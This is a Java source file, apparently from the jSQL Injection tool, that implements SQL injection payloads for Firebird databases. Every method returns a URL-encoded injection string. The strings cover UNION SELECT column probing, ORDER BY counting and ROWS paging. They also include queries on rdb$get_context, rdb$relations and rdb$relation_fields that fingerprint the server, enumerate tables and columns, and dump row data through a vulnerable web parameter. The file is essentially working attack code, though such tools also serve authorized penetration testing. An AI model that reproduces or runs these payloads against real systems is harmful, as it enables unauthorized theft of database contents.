package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.QTE_SQL;
import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.util.StringUtil;

public class FirebirdVendor extends AbstractVendorDefault {

    @Override
    public String getSqlInfos() {
        return
            "SELECT+rdb$get_context('SYSTEM','ENGINE_VERSION')||'"+ SEPARATOR_SQL +"'||rdb$get_context('SYSTEM','DB_NAME')"
            + "||'"+ SEPARATOR_SQL +"'||rdb$get_context('SYSTEM','CURRENT_USER')||'"+ TRAIL_SQL +"'from+rdb$database";
    }

    @Override
    public String getSqlDatabases() {
        return
            /**
             * aggreg function return exec fault
             * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
             * => use limit 1,1 instead
             */
            "select+'"+ SEPARATOR_SQL +"'||rdb$get_context('SYSTEM','DB_NAME')||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+rdb$database{limit}";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "SELECT'"+ SEPARATOR_SQL +"'||trim(rdb$relation_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+rdb$relations{limit}";

    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "SELECT'"+ SEPARATOR_SQL +"'||trim(rdb$field_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+rdb$relation_fields+where+rdb$relation_name='" + table + "'{limit}";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, ",''))||'%7f'||trim(coalesce(");
        formatListColumn = "trim(coalesce(" + formatListColumn + ",''))";
        
        return
            "SELECT'"+ SEPARATOR_SQL +"'||" + formatListColumn + "||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+" + table + "{limit}";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
            "select+" +
                /**
                 * If reach end of string (SQLii) then NULLIF nullifies the result
                 */
                 "'SQLi'||NULLIF(substring(" +
                 "(" + sqlQuery + ")from+" +
                 startPosition + "+for+" +
                 "65536" +
             "),'"+ TRAIL_SQL +"')from+RDB$DATABASE";
     }

     @Override
     public String getSqlCapacity(String[] indexes) {
         return
             MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
                 "(select+'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'from+RDB\\$DATABASE)"
             );
     }

    @Override
    public String getSqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("(1337"+ i +"7330%2b1)");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "+from+RDB$DATABASE--+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+ROWS+" + (limitSQLResult+1) + "+TO+" + (limitSQLResult+1) + "";
    }
}